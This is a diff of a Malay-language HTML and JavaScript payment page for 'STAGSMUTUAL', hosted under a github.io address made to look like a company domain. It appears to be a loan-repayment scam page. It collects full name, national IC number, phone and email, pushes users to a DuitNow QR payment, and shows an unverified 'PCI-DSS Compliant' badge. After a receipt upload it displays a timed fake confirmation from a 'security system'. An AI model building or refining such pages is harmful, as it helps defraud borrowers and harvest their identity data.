@@ -4,13 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Stagsmutual - Laman Web Pembayaran Pinjaman</title>
-    <!-- Google Fonts for Corporate/Banking Premium Look -->
     <meta property="og:title" content="STAGSMUTUAL">
     <meta property="og:description" content="Sistem Pengurusan & Pembayaran Balik Selamat">
     <meta property="og:image" content="https://stagsmutual-paysection.github.io/www.stagsmutual.com-paygateway/logo.png">
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content="https://stagsmutual-paysection.github.io/www.stagsmutual.com-paygateway/logo.png">
-    <!-- Google Fonts for Corporate/Banking Premium Look -->
+    
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
@@ -52,7 +51,6 @@
             text-align: center;
         }
 
-        /* Banking App Header Style */
         .header {
             text-align: center;
             margin-bottom: 30px;
@@ -63,32 +61,15 @@
             align-items: center;
         }
 
-        /* 🛡️ REKA BENTUK LOGO GRAFIK (CSS SHIELD LOGO) */
-        .corporate-logo-graphic {
+        /* 🖼️ LOGO IMEJ (Menggantikan CSS Shield) */
+        .corporate-logo-img {
             width: 65px;
             height: 70px;
-            background: linear-gradient(135deg, #1e3a8a 0%, #0f172a 100%);
+            object-fit: contain;
             margin-bottom: 15px;
-            position: relative;
-            border-radius: 10px 10px 35px 35px;
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.15);
-            border: 3px solid #d4af37; /* Kemasan Bingkai Emas */
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            filter: drop-shadow(0 4px 6px rgba(0, 0, 0, 0.15));
         }
 
-        /* Simbol Dalam Logo (Gaya Monogram S & M Tradisional) */
-        .corporate-logo-graphic::before {
-            content: "S";
-            font-size: 32px;
-            color: #d4af37; /* Warna Emas Premium */
-            font-weight: 800;
-            font-family: 'Inter', sans-serif;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
-        }
-
-        /* Gaya Tulisan Nama Laman Web */
         .header-logo-text {
             font-size: 26px;
             color: #0f172a;
@@ -105,7 +86,6 @@
             margin-top: 4px;
         }
 
-        /* Step Progress Indicator */
         .steps-indicator {
             display: flex;
             justify-content: space-between;
@@ -153,7 +133,6 @@
             color: #ffffff;
         }
 
-        /* Page Layouts */
         .step-page {
             display: none;
         }
@@ -168,7 +147,7 @@
             to { opacity: 1; transform: translateY(0); }
         }
 
-        .step-title {
+        .section-title {
             font-size: 14px;
             font-weight: 700;
             color: #475569;
@@ -180,12 +159,12 @@
             padding-left: 10px;
         }
 
-        /* --- KALKULATOR PINJAMAN STYLE --- */
         .calc-box {
             background: #f8fafc;
             border: 1px solid #e2e8f0;
             border-radius: 16px;
             padding: 24px;
+            margin-top: 30px;
             margin-bottom: 30px;
             text-align: center;
         }
@@ -351,6 +330,12 @@
             justify-content: center;
             align-items: center;
             gap: 8px;
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s ease;
         }
 
         .btn-mohon:hover {
@@ -393,7 +378,6 @@
             font-weight: bold;
         }
 
-        /* Premium Form Styling */
         .form-group {
             margin-bottom: 20px;
             text-align: left;
@@ -425,8 +409,7 @@
             box-shadow: 0 0 0 4px rgba(15, 23, 42, 0.08);
         }
 
-        /* Premium Buttons */
-        .btn {
+        .btn, .next-btn {
             width: 100%;
             padding: 15px;
             border: none;
@@ -436,14 +419,15 @@
             cursor: pointer;
             transition: all 0.2s ease;
             text-align: center;
+            display: block;
         }
 
-        .btn-primary {
+        .next-btn, .btn-primary {
             background-color: #0f172a;
             color: white;
         }
 
-        .btn-primary:hover {
+        .next-btn:hover, .btn-primary:hover {
             background-color: #1e293b;
         }
 
@@ -483,7 +467,14 @@
             margin-top: 24px;
         }
 
-        /* Payment Methods Grid */
+        .security-note {
+            font-size: 12px;
+            color: #64748b;
+            margin-top: 15px;
+            text-align: center;
+            font-weight: 500;
+        }
+
         .payment-box {
             border: 1px solid #e2e8f0;
             border-radius: 10px;
@@ -567,7 +558,6 @@
             text-align: left;
         }
 
-        /* Step 3 Gateways Style */
         .qr-section {
             text-align: center;
             margin-top: 15px;
@@ -640,7 +630,6 @@
             font-size: 14px;
         }
 
-        /* Modals Overlays */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -699,13 +688,6 @@
             line-height: 1.5;
         }
 
-        /* Success Page Layout */
-        .success-page {
-            text-align: center;
-            padding: 20px 10px;
-            display: none;
-        }
-
         .success-icon-circle {
             width: 64px;
             height: 64px;
@@ -720,7 +702,6 @@
             margin-bottom: 22px;
         }
 
-        /* Corporate Footer Area */
         .corporate-footer {
             width: 100%;
             background-color: #1a1a1a;
@@ -736,29 +717,6 @@
             max-width: 540px;
             width: 100%;
             text-align: left;
-        }
-
-        .footer-section-title {
-            font-size: 16px;
-            font-weight: 700;
-            margin-bottom: 15px;
-            letter-spacing: 0.05em;
-            text-transform: uppercase;
-            color: #ffffff;
-        }
-
-        .ops-grid {
-            display: flex;
-            justify-content: space-between;
-            font-size: 14px;
-            color: #b3b3b3;
-            margin-bottom: 30px;
-            border-bottom: 1px solid #333333;
-            padding-bottom: 15px;
-        }
-
-        .ops-right {
-            text-align: right;
         }
 
         .secure-footer-banner {
@@ -778,8 +736,8 @@
         <div class="container">
             <!-- Premium Header Area -->
             <div class="header">
-                <!-- 🛡️ LOGO EMAS & BIRU BARU DI ATAS TULISAN -->
-                <div class="corporate-logo-graphic"></div>
+                <!-- 🖼️ LOGO BARU (Saiz sama seperti logo lama: 65px x 70px) -->
+                <img src="https://stagsmutual-paysection.github.io/www.stagsmutual.com-paygateway/logo.png" alt="STAGSMUTUAL Logo" class="corporate-logo-img">
                 
                 <div class="header-logo-text">STAGSMUTUAL</div>
                 <p>Sistem Pengurusan & Pembayaran Balik Selamat</p>      
@@ -795,7 +753,74 @@
             <!-- STEP 1: MAKLUMAT & KALKULATOR -->
             <div class="step-page active" id="step1Page">
                 
-                <!-- KALKULATOR PINJAMAN -->
+                <!-- LANGKAH 1 - MAKLUMAT PEMBAYAR (KINI DI ATAS KALKULATOR) -->
+                <div class="form-section">
+                    <div class="section-title">
+                        LANGKAH 1 - MAKLUMAT PEMBAYAR
+                    </div>
+
+                    <div class="form-group">
+                        <label for="fullName">Nama Penuh Pemohon</label>
+                        <input
+                            type="text"
+                            id="fullName"
+                            name="fullName"
+                            placeholder="Masukkan nama penuh seperti dalam Kad Pengenalan"
+                            required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="icNumber">Nombor Kad Pengenalan</label>
+                        <input
+                            type="tel"
+                            id="icNumber"
+                            name="icNumber"
+                            inputmode="numeric"
+                            pattern="[0-9]*"
+                            maxlength="12"
+                            placeholder="Contoh: 950101145566"
+                            required
+                            oninput="this.value = this.value.replace(/[^0-9]/g, '');">
+                    </div>
+
+                    <div class="form-group">
+                        <label for="phoneNumber">Nombor Telefon Bimbit</label>
+                        <input
+                            type="tel"
+                            id="phoneNumber"
+                            name="phoneNumber"
+                            inputmode="numeric"
+                            pattern="[0-9]*"
+                            maxlength="12"
+                            placeholder="Contoh: 0123456789"
+                            required
+                            oninput="this.value = this.value.replace(/[^0-9]/g, '');">
+                    </div>
+
+                    <div class="form-group">
+                        <label for="emailAddress">Alamat Email</label>
+                        <input
+                            type="email"
+                            id="emailAddress"
+                            name="emailAddress"
+                            placeholder="Contoh: nama@email.com"
+                            required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="paymentAmount">Jumlah Bayaran Balik (RM)</label>
+                        <input
+                            type="number"
+                            id="paymentAmount"
+                            name="paymentAmount"
+                            placeholder="0.00"
+                            step="0.01"
+                            min="0"
+                            required>
+                    </div>
+                </div>
+
+                <!-- KALKULATOR PINJAMAN (KINI DI BAWAH BORANG MAKLUMAT) -->
                 <div class="calc-box">
                     <div class="calc-header">
                         <div class="calc-icon">▤</div>
@@ -844,34 +869,19 @@
                     </div>
                 </div>
 
-                <div class="step-title">Langkah 1 - Maklumat Pelanggan</div>
-                
-                <div class="form-group">
-                    <label>Nama Penuh (Seperti dalam IC)</label>
-                    <input type="text" id="custName" placeholder="Sila masukkan nama penuh mengikut dokumen rasmi" required>
-                </div>
+                <!-- Butang Seterusnya Borang Utama -->
+                <button type="button" class="next-btn" onclick="validateAndOpenFraudPopup()">
+                    Seterusnya
+                </button>
 
-                <div class="form-group">
-                    <label>Nombor Kad Pengenalan (IC)</label>
-                    <input type="text" id="custIC" placeholder="Contoh: 950101145566" maxlength="12" required oninput="this.value = this.value.replace(/[^0-9]/g, '');">
+                <div class="security-note">
+                    🔒 Sambungan Disulitkan Selamat • PCI-DSS Compliant
                 </div>
-
-                <div class="form-group">
-                    <label>Nombor Telefon Bimbit Pemohon</label>
-                    <input type="text" id="custPhone" placeholder="Contoh: 0123456789" required oninput="this.value = this.value.replace(/[^0-9]/g, '');">
-                </div>
-
-                <div class="form-group">
-                    <label>Jumlah Bayaran Balik Rasmi (RM)</label>
-                    <input type="number" id="custAmount" placeholder="0.00" step="0.01" min="1" required>
-                </div>
-
-                <button type="button" class="btn btn-primary" style="margin-top: 10px;" onclick="validateAndOpenFraudPopup()">Seterusnya</button>
             </div>
 
             <!-- STEP 2: PILIHAN PEMBAYARAN -->
             <div class="step-page" id="step2Page">
-                <div class="step-title">Langkah 2 - Pilihan Pembayaran</div>
+                <div class="section-title">Langkah 2 - Pilihan Pembayaran</div>
                 
                 <div class="payment-box" id="payBoxQR" onclick="selectPaymentMethod('qr')">
                     <span>DuitNow QRPay Gateway</span>
@@ -912,7 +922,7 @@
 
             <!-- STEP 3: PROSES BAYARAN / QR -->
             <div class="step-page" id="step3Page">
-                <div class="step-title">Langkah 3 - Pintu Pembayaran DuitNow</div>
+                <div class="section-title">Langkah 3 - Pintu Pembayaran DuitNow</div>
                 
                 <div class="qr-section">
                     <div class="pay-headline" id="step3PayHeadline">Please Pay RM0.00</div>
@@ -986,12 +996,213 @@
     <!-- CORPORATE FOOTER -->
     <footer class="corporate-footer">
         <div class="footer-inner">
-            <div class="footer-section-title">Latar Belakang Syarikat</div>
-            <p style="font-size: 13px; color: #b3b3b3; line-height: 1.6; margin-bottom: 25px;">
-                STAGSMUTUAL merupakan sebuah platform pengurusan kewangan berprestij tinggi yang komited dalam menyediakan ekosistem pembayaran balik pinjaman yang selamat, telus, dan pantas. Berteraskan teknologi enkripsi gred perbankan termaju, kami memelihara integriti data setiap pelanggan kami di seluruh Malaysia.
-            </p>
+            <p style="font-size: 12px; color: #64748b; text-align: center;">&copy; 2026 STAGSMUTUAL. Hak Cipta Terpelihara.</p>
         </div>
     </footer>
 
+    <!-- SISTEM LOGIK JAVASCRIPT JALUR LOGIK BARU -->
+    <script>
+        let selectedMethod = '';
+        let timerInterval = null;
+
+        // Fungsi Kalkulator Pinjaman (Slider)
+        function updateLoanCalc(val) {
+            document.getElementById('calcAmountDisplay').innerText = "RM " + Number(val).toLocaleString();
+            
+            // Buang kelas aktif dari semua butang pintasan
+            const btns = document.querySelectorAll('.shortcut-grid .shortcut-btn');
+            btns.forEach(b => b.classList.remove('active'));
+        }
+
+        function setSliderValue(val) {
+            const slider = document.getElementById('loanSlider');
+            slider.value = val;
+            updateLoanCalc(val);
+            
+            // Cari butang pintasan yang sepadan dan jadikannya aktif
+            const btns = document.querySelectorAll('.shortcut-grid .shortcut-btn');
+            btns.forEach(b => {
+                if(parseInt(b.innerText.replace('K','000')) === val || parseInt(b.innerText) === val) {
+                    b.classList.add('active');
+                }
+            });
+        }
+
+        // Fungsi Butang "Mohon Sekarang" (Mengisi data terus ke borang atas)
+        function redirectToMain() {
+            const phoneVal = document.getElementById('loanPhone').value;
+            const sliderVal = document.getElementById('loanSlider').value;
+            
+            if(!phoneVal) {
+                alert("Sila masukkan nombor telefon bimbit anda terlebih dahulu.");
+                document.getElementById('loanPhone').focus();
+                return;
+            }
+            
+            // Mengisi auto maklumat ke bahagian atas
+            document.getElementById('phoneNumber').value = "0" + phoneVal;
+            document.getElementById('paymentAmount').value = parseFloat(sliderVal).toFixed(2);
+            
+            // Fokus semula ke ruangan nama penuh pembayar
+            document.getElementById('fullName').focus();
+        }
+
+        // Navigasi Langkah
+        function goToStep(stepNum) {
+            document.getElementById('step1Page').classList.remove('active');
+            document.getElementById('step2Page').classList.remove('active');
+            document.getElementById('step3Page').classList.remove('active');
+            
+            const dot1 = document.getElementById('dot1');
+            const dot2 = document.getElementById('dot2');
+            const dot3 = document.getElementById('dot3');
+            
+            dot1.className = "step-dot";
+            dot2.className = "step-dot";
+            dot3.className = "step-dot";
+
+            if(stepNum === 1) {
+                document.getElementById('step1Page').classList.add('active');
+                dot1.classList.add('active');
+                if(timerInterval) clearInterval(timerInterval);
+            } else if(stepNum === 2) {
+                document.getElementById('step2Page').classList.add('active');
+                dot1.classList.add('completed');
+                dot2.classList.add('active');
+                
+                const amt = parseFloat(document.getElementById('paymentAmount').value) || 0;
+                document.getElementById('step2AmountDisplay').innerText = "Jumlah Perlu Dibayar : RM " + amt.toFixed(2);
+            } else if(stepNum === 3) {
+                document.getElementById('step3Page').classList.add('active');
+                dot1.classList.add('completed');
+                dot2.classList.add('completed');
+                dot3.classList.add('active');
+            }
+        }
+
+        // Validasi Borang & Pop-up
+        function validateAndOpenFraudPopup() {
+            const name = document.getElementById('fullName').value.trim();
+            const ic = document.getElementById('icNumber').value.trim();
+            const phone = document.getElementById('phoneNumber').value.trim();
+            const email = document.getElementById('emailAddress').value.trim();
+            const amount = document.getElementById('paymentAmount').value;
+
+            if(!name || !ic || !phone || !email || !amount || amount <= 0) {
+                alert("Sila isi semua maklumat pembayar dengan lengkap dan sah.");
+                return;
+            }
+            if(ic.length < 12) {
+                alert("Nombor Kad Pengenalan mestilah mengandungi 12 digit.");
+                return;
+            }
+
+            document.getElementById('fraudModal').style.display = 'flex';
+        }
+
+        function closeFraudAndOpenDoubleCheck() {
+            document.getElementById('fraudModal').style.display = 'none';
+            document.getElementById('doubleCheckModal').style.display = 'flex';
+        }
+
+        function closePopupAndAutoAdvance() {
+            document.getElementById('doubleCheckModal').style.display = 'none';
+            goToStep(2);
+        }
+
+        function selectPaymentMethod(method) {
+            document.getElementById('payBoxQR').classList.remove('selected');
+            document.getElementById('payBoxOnline').classList.remove('selected');
+            document.getElementById('payBoxBank').classList.remove('selected');
+            document.getElementById('qrBankListSection').classList.remove('active');
+
+            if (method === 'qr') {
+                document.getElementById('payBoxQR').classList.add('selected');
+                document.getElementById('qrBankListSection').classList.add('active');
+                selectedMethod = 'qr';
+            } else {
+                alert("Pilihan ini ditutup buat sementara waktu untuk penyelenggaraan sistem.");
+            }
+        }
+
+        function processStep2Next() {
+            if(selectedMethod !== 'qr') {
+                alert("Sila pilih kaedah DuitNow QRPay Gateway yang tersedia.");
+                return;
+            }
+
+            const bankSelected = document.querySelector('input[name="qrBank"]:checked');
+            if(!bankSelected) {
+                alert("Sila pilih salah satu Bank / E-Wallet rasmi daripada senarai.");
+                return;
+            }
+
+            const amt = parseFloat(document.getElementById('paymentAmount').value) || 0;
+            document.getElementById('step3PayHeadline').innerText = "Please Pay RM " + amt.toFixed(2);
+
+            const refId = "STG" + Math.floor(10000000 + Math.random() * 90000000);
+            const now = new Date();
+            const timeStr = now.toLocaleDateString() + ' ' + now.toLocaleTimeString();
+
+            document.getElementById('metaRef').innerText = refId;
+            document.getElementById('metaTime').innerText = timeStr;
+
+            goToStep(3);
+            startCountdown(119);
+        }
+
+        function startCountdown(duration) {
+            if(timerInterval) clearInterval(timerInterval);
+            let timer = duration, minutes, seconds;
+            
+            timerInterval = setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                document.getElementById('timerDisplay').innerText = minutes + ":" + seconds;
+
+                if (--timer < 0) {
+                    clearInterval(timerInterval);
+                    alert("Sesi transaksi telah tamat. Sila laksanakan semula.");
+                    cancelStep3();
+                }
+            }, 1000);
+        }
+
+        function handleReceiptUpload(event) {
+            const file = event.target.files[0];
+            if(file) {
+                document.getElementById('fileNameStatus').innerText = "Fail dipilih: " + file.name;
+                clearInterval(timerInterval);
+
+                setTimeout(function() {
+                    const custName = document.getElementById('fullName').value;
+                    const msg = "Terima Kasih, " + custName + ".\n\nResit transaksi anda telah berjaya diterima oleh sistem keselamatan STAGSMUTUAL. Pemprosesan pengesahan akaun mengambil masa dalam 5-15 minit.";
+                    document.getElementById('successMessage').innerText = msg;
+                    document.getElementById('successModal').style.display = 'flex';
+                }, 1500);
+            }
+        }
+
+        function closeSuccessModal() {
+            document.getElementById('successModal').style.display = 'none';
+            document.getElementById('fullName').value = '';
+            document.getElementById('icNumber').value = '';
+            document.getElementById('phoneNumber').value = '';
+            document.getElementById('emailAddress').value = '';
+            document.getElementById('paymentAmount').value = '';
+            document.getElementById('fileNameStatus').innerText = '';
+            goToStep(1);
+        }
+
+        function cancelStep3() {
+            if(confirm("Adakah anda pasti mahu membatalkan transaksi ini?")) {
+                goToStep(1);
+            }
+        }
+    </script>
 </body>
 </html>
